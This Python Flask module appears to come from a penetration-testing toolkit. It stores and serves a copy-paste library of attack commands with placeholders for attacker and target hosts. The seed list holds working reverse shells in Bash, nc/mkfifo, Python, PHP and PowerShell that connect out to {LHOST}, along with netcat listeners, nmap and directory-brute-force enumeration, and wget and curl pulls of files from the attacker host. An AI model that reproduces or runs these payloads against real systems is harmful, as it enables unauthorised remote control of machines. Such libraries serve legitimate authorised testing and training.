"""
Snippets module — a payload/command library with variable substitution.

Commands hold placeholders ({LHOST}, {LPORT}, {RHOST}, {PORT}, {URL}, {WORDLIST});
the UI fills them once and every snippet updates for copy-paste. Ships a seed set of
common pentest one-liners. User-added snippets persist alongside.
"""
from __future__ import annotations

import json
import os
import secrets
from pathlib import Path

from flask import Blueprint, jsonify, request

bp = Blueprint("snippets", __name__, url_prefix="/api/snippets")

STORE = Path(os.environ.get(
    "CYBERDECK_SNIPPETS",
    str(Path(__file__).resolve().parents[2] / "data" / "snippets.json"),
))

VARS = ["LHOST", "LPORT", "RHOST", "PORT", "URL", "WORDLIST"]

SEED = [
    ("Reverse Shells", "Bash TCP", "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"),
    ("Reverse Shells", "Bash (196)", "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196"),
    ("Reverse Shells", "sh mkfifo / nc", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"),
    ("Reverse Shells", "Python3", "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"),
    ("Reverse Shells", "PHP", "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    ("Reverse Shells", "PowerShell", "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}\""),
    ("Listeners", "netcat", "nc -lvnp {LPORT}"),
    ("Listeners", "rlwrap netcat", "rlwrap -cAr nc -lvnp {LPORT}"),
    ("Enumeration", "nmap quick", "nmap -sC -sV -oN nmap_initial {RHOST}"),
    ("Enumeration", "nmap full TCP", "nmap -p- --min-rate 5000 -oN nmap_allports {RHOST}"),
    ("Enumeration", "nmap UDP top", "nmap -sU --top-ports 100 -oN nmap_udp {RHOST}"),
    ("Enumeration", "gobuster dir", "gobuster dir -u {URL} -w {WORDLIST} -t 50 -o gobuster.txt"),
    ("Enumeration", "ffuf dir", "ffuf -u {URL}/FUZZ -w {WORDLIST} -mc 200,204,301,302,307,401,403"),
    ("Enumeration", "feroxbuster", "feroxbuster -u {URL} -w {WORDLIST}"),
    ("Enumeration", "smbclient list", "smbclient -L //{RHOST}/ -N"),
    ("Enumeration", "enum4linux-ng", "enum4linux-ng -A {RHOST}"),
    ("File Transfer", "python http server", "python3 -m http.server {PORT}"),
    ("File Transfer", "wget pull", "wget http://{LHOST}:{PORT}/file -O /tmp/file"),
    ("File Transfer", "curl pull", "curl http://{LHOST}:{PORT}/file -o /tmp/file"),
    ("Shell Upgrade", "python pty", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"),
    ("Shell Upgrade", "stty raw", "stty raw -echo; fg   # then: export TERM=xterm; stty rows 38 columns 116"),
]


def _load() -> dict:
    if STORE.exists():
        try:
            return json.loads(STORE.read_text("utf-8"))
        except Exception:
            pass
    seeded = {"snippets": [
        {"id": secrets.token_hex(5), "category": c, "title": t, "command": cmd, "seed": True}
        for c, t, cmd in SEED
    ]}
    _save(seeded)
    return seeded


def _save(d: dict):
    STORE.parent.mkdir(parents=True, exist_ok=True)
    STORE.write_text(json.dumps(d, indent=2), "utf-8")


@bp.route("/list")
def list_snippets():
    d = _load()
    cats = {}
    for s in d["snippets"]:
        cats.setdefault(s["category"], []).append(s)
    ordered = [{"category": c, "items": cats[c]} for c in
               sorted(cats, key=lambda c: (c != "Reverse Shells", c))]
    return jsonify(categories=ordered, vars=VARS)


@bp.route("/add", methods=["POST"])
def add():
    d0 = request.get_json(silent=True) or {}
    if not (d0.get("title") or "").strip() or not (d0.get("command") or "").strip():
        return jsonify(error="title and command required"), 400
    d = _load()
    d["snippets"].append({"id": secrets.token_hex(5), "category": (d0.get("category") or "Custom").strip(),
                          "title": d0["title"].strip(), "command": d0["command"].strip()})
    _save(d)
    return jsonify(ok=True)


@bp.route("/<sid>", methods=["DELETE"])
def delete(sid):
    d = _load()
    d["snippets"] = [s for s in d["snippets"] if s["id"] != sid]
    _save(d)
    return jsonify(ok=True)
